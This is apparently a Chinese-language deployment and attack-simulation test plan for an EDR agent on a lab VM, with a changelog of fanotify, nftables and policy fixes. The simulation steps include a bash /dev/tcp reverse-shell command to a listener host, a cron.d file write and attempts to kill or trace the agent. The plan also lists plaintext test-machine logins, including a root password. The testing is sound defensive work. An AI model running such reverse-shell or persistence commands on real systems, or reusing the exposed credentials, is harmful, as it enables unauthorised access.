# EDR v0.7 演习模式部署测试计划

## Context
将 EDR v0.7 以演习模式部署到测试 VM（lcz@192.168.214.144），模拟实战 EDR 状态，进行全场景攻击检测验证。部署方式：纯 CLI 管理（无 web 端，无 webhook），systemd 托管。

## 前置条件
- 测试机：192.168.214.144，账户 lcz/123456，root/0245990922Wxa
- 本机：192.168.214.143
- 测试机已是 VM 且有快照，内核模块测试风险可控
- 部署方式：sshpass 自动化 SSH

---

## Phase 1: 环境检查

SSH 到测试机确认：
- 内核版本 >= 5.8，`/sys/kernel/btf/vmlinux` 存在
- 工具链：clang, bpftool, go 1.22+, libbpf-dev
- 检查是否有残留的 edr-agent 进程或 nftables edr 表

## Phase 2: 编译（在测试机上执行）

1. SCP 源码到测试机 `/tmp/edr-build/`
2. `make bpf-vmlinux` — 从目标内核生成 vmlinux.h
3. `make bpf-build` — 编译 12 个 BPF 探针
4. `make bpf-link` — 合并为 all.bpf.o
5. `make build-bpf` — cgo 编译 edr-agent + edrctl

## Phase 3: 配置准备

创建新文件 `configs/agent_exercise_cli.json`：
- 基于 `agent_exercise.json`
- 移除 `webhooks` 数组
- `anchor.enabled` 设为 `false`
- 其余保持演习模式参数（dry_run=false, rootkit monitor_only=false, system paths）

## Phase 4: 部署（在测试机上执行，root）

1. 创建目录结构：`/opt/edr`, `/etc/edr`, `/var/lib/edr`, `/var/log/edr`
2. 部署二进制：`edr-agent` → `/opt/edr/`, `edrctl` → `/opt/edr/`
3. 部署配置：`agent_exercise_cli.json` → `/etc/edr/agent.json`
4. 部署策略：`policy_exercise.json` → `/etc/edr/policy.json`
5. 部署探针：`all.bpf.o` → `/opt/edr/probes/`
6. 生成签名密钥：`/var/lib/edr/log.key`
7. 安装 systemd unit：`edr-agent-exercise.service`
8. `systemctl daemon-reload && systemctl start edr-agent`

## Phase 5: 攻击模拟测试

### 5.1 烟雾测试
- `edrctl health` — 验证服务响应
- `edrctl status` — 检查 BPF 探针加载、ring0 状态
- `edrctl metrics` — 确认指标采集正常

### 5.2 进程黑名单阻断（Ring0 即时 SIGKILL）
- 执行 policy_exercise.json 中黑名单列出的程序名
- 预期：进程被内核态 SIGKILL，edrctl events query 中可见 audit 事件

### 5.3 反弹Shell检测
- `bash -c "exec 5<>/dev/tcp/192.168.214.143/9999"`（本机 nc -l 9999 监听）
- 预期：EventConnect 事件 + 反弹Shell 规则匹配（alert 或 block 取决于 Day1/Day2 策略）

### 5.4 提权检测
- 执行 `sudo id` 或调用 setuid(0) 的程序
- 预期：EventPrivesc 事件 + 提权规则命中

### 5.5 自我防护 — kill
- `kill -9 $(pgrep edr-agent)`
- 预期：LSM 阻断，EventSensorTamper 事件

### 5.6 自我防护 — ptrace
- `strace -p $(pgrep edr-agent)`
- 预期：LSM 阻断，EventSensorTamper 事件

### 5.7 文件篡改检测
- `echo "malicious" > /etc/cron.d/test_job`
- 预期：fanotify 拦截 + 文件类规则匹配

### 5.8 内核模块加载检测
- `modprobe dummy`（安全的内核模块）
- 预期：ROOTKIT-001 检测（module.bpf.c 探针）

### 5.9 后续扩展（用户提供 rootkit 工具后）
- 隐藏进程检测（ROOTKIT-002）
- 隐藏内核模块检测（ROOTKIT-004）
- 未授权 BPF 操作检测（ROOTKIT-005）

## Phase 6: 结果验证

全部通过 edrctl CLI：
```
edrctl events tail                          # 实时事件流
edrctl events query --category rootkit      # Rootkit 事件
edrctl events query --severity critical     # 严重事件
edrctl events query --decision block        # 阻断事件
edrctl responses list                       # 响应历史
edrctl report generate                      # 攻击链报告
edrctl events verify                        # 日志链完整性
edrctl process frozen                       # 冻结进程状态
edrctl network nft list                     # nftables 阻断规则
```

---

## 已修复的问题 (v0.7.2)

本次修复共 7 项，根因及修复方案如下。所有模块保持启用状态，不削弱任何 EDR 功能。

### 1. process_access 白名单缺失导致 SSH Shell 被杀 (致命)

**根因**：`configs/policy_exercise.json` 中 `process_access.mode: "enforce"` 且白名单非空时，`EvaluateProcessAccess()` 会对所有不在白名单也不在黑名单的进程返回 `decision="block", action="kill"`。SSH 登录后 sshd 启动的 bash/sh 不在白名单中，BPF exec 探针触发后立即被 SIGKILL，SSH 会话反复断连。

**修复**：在 `configs/policy_exercise.json` 的 `process_access.whitelist` 中追加 `bash`、`sh`、`dash`、`zsh`、`sudo`、`su`、`login`、`agetty`、`edr-agent`、`edrctl`。黑名单照常拦截攻击工具，规则引擎其他 89 条规则照常工作，安全性不受影响。

**涉及文件**：`configs/policy_exercise.json`

### 2. fanotify 对每个事件先读 4 个 /proc 文件再检查白名单 (性能)

**根因**：`handleEvent()` 在处理每个权限事件时先调用 `resolveAccessInfo()` 读取 `/proc/PID/{comm,status,exe,cmdline}` 共 4 个文件，然后才检查 `isCriticalProcess`。对 sshd/systemd 等已白名单进程，UID/exe/cmdline 的读取纯属浪费，且在高事件量时增加延迟。

**修复**：先只读 comm 并检查 `isCriticalProcess`，命中则直接 ALLOW 返回。仅在需要策略评估时才读取其余 /proc 文件。同时移除已内联的 `resolveAccessInfo()` 函数。

**涉及文件**：`internal/fanotify/fanotify.go`

### 3. fanotify 关键进程白名单扩展

**根因**：`isCriticalProcess` 中缺少 `bash`、`sh`、`dash`、`zsh`、`edr-agent`、`edrctl`。这些进程的文件打开操作会经过完整策略评估，增加不必要的延迟。

**修复**：在 `isCriticalProcess` 的 switch 中追加以上进程名。

**涉及文件**：`internal/fanotify/fanotify.go`

### 4. fanotify 关键路径白名单扩展

**根因**：`criticalPathPrefixes` 缺失 `/run/`（systemd 运行时通信）、`/dev/pts/`（SSH 伪终端）、`/etc/profile.d/`、`/etc/bash.bashrc` 等 shell 初始化路径。这些路径的文件打开不应被 fanotify 拦截。

**修复**：补全以上路径前缀。

**涉及文件**：`internal/fanotify/fanotify.go`

### 5. nftables ApplyIsolate 非原子安装导致瞬断

**根因**：`ApplyIsolate()` 先创建 `policy drop` 的 chain，再逐条 `exec.Command("nft", "add", "rule", ...)` 添加 accept 规则。中间窗口期（数十到数百毫秒）所有 OUTPUT 流量被丢弃，SSH 响应 TCP ACK 在此期间被丢弃导致断连。

**修复**：将所有规则拼为完整脚本，通过 `nft -f -` 管道一次性原子提交。同时新增 `tcp dport 22 accept` 规则确保 SSH 管理通道不中断。

**涉及文件**：`internal/response/nft.go`

### 6. resolvePath 未处理 deleted 后缀

**根因**：`os.Readlink` 对已删除但仍打开的 fd 返回 `/path/to/file (deleted)`。此后缀导致 `isCriticalPath` 的 `strings.HasPrefix` 匹配失败，白名单在该场景下失效。

**修复**：在 `resolvePath` 返回前执行 `strings.TrimSuffix(link, " (deleted)")`。

**涉及文件**：`internal/fanotify/fanotify.go`

### 7. EvaluateProcessAccess default-deny 行为文档化

**根因**：`whitelist: []` 空时 = 默认放行，`whitelist: [...]` 非空时 = 默认拒绝。此二义性是 Bug 1 发生的根源。

**修复**：在 default-deny 分支上方添加明确注释，说明两种模式的行为差异以及使用 enforce 模式白名单时的注意事项。

**涉及文件**：`internal/policy/policy.go`

### 8. fanotify 阻塞 EDR 自身配置目录 (部署过程中发现)

**根因**：`criticalPathPrefixes` 缺失 `/etc/edr/` 和 `/opt/edr/`。Agent 运行时 fanotify 拦截任何进程对 `/etc/edr/policy.json` 等自身配置文件的读取（`cat`、`grep` 等管理工具被误阻），返回 EPERM。

**修复**：追加 `/opt/edr/`、`/etc/edr/` 到 `criticalPathPrefixes`。

**涉及文件**：`internal/fanotify/fanotify.go`

---

## 已修复的问题

### fanotify SSH 断连根因修复 (v0.7.1)

**根因**：fanotify 对 `/etc`、`/home`、`/root` 进行递归标记，当 sshd 打开 `/etc/ssh/sshd_config` 或 `/root/.ssh/authorized_keys` 等关键文件时，如果 writeResponse 失败或策略误阻止，内核不会收到响应，进程会永久挂起，导致 SSH 连接中断。

**修复内容**（`internal/fanotify/fanotify.go`）：

1. **关键进程/路径白名单**：sshd、systemd、dbus-daemon 等系统关键进程以及 `/etc/ssh/`、`/root/.ssh/`、`/etc/pam.d/` 等关键路径在策略评估前就直接放行，不会被 fanotify 阻止。

2. **writeResponse 回退**：如果响应写入失败（内核未收到响应），自动重试 FAN_ALLOW 以防止进程挂起。

3. **移除 FAN_AUDIT 标志**：DENY 响应从 `FAN_DENY | FAN_AUDIT` (0x12) 改为仅 `FAN_DENY` (0x02)，避免旧内核上的 EINVAL。

## 修改的文件

- **新增** `configs/agent_exercise_cli.json` — 纯 CLI 演习配置（去掉 webhook，关闭 anchor）
- **修改** `internal/fanotify/fanotify.go` — 添加系统进程/路径白名单 + writeResponse 回退
- **修改** `systemd/edr-agent-exercise.service` — 更新路径到系统标准目录

## 验证方式

1. 每个攻击场景执行后立即用 `edrctl events query` 确认事件已记录
2. 用 `edrctl report generate` 生成完整攻击链报告
3. 用 `edrctl events verify` 验证日志哈希链未被破坏
4. 确认 agent 运行期间 SSH 连接保持稳定
5. 确认 `systemctl stop edr-agent` 被拒绝（RefuseManualStop）
